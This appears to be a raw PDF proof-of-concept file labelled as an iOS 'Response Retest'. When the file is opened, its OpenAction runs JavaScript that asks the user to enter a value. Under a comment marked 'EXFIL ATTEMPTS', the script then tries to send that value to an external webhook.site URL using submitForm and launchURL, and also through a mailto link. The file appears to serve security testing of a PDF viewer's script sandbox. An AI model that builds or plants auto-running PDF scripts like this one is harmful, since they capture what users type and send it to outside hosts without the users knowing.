%PDF-1.7
% Response Return Retest - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        results.push("before response");

        var captured = app.response("Enter test value:", "Power Apps");

        results.push("after response");
        results.push("typeof captured: " + typeof captured);
        results.push("value: [" + captured + "]");
        results.push("is null: " + (captured === null));
        results.push("length: " + (captured ? captured.length : "n/a"));

        // If we got here, try writing it somewhere
        if (captured && captured !== null) {
          results.push("=== EXFIL ATTEMPTS ===");

          try {
            this.submitForm({
              cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?c=" + captured,
              cSubmitAs: "HTML"
            });
            results.push("submitForm: no throw");
          } catch(e) { results.push("submitForm: " + e); }

          try {
            app.launchURL(
              "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?c=" + captured,
              false
            );
            results.push("launchURL: no throw");
          } catch(e) { results.push("launchURL: " + e); }

          try {
            app.launchURL("mailto:?subject=pa&body=" + captured, false);
            results.push("mailto: no throw");
          } catch(e) { results.push("mailto: " + e); }
        }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Response Retest) Tj ET
BT /F1 12 Tf 50 220 Td (Enter text then check output) Tj ET
endstream
endobj

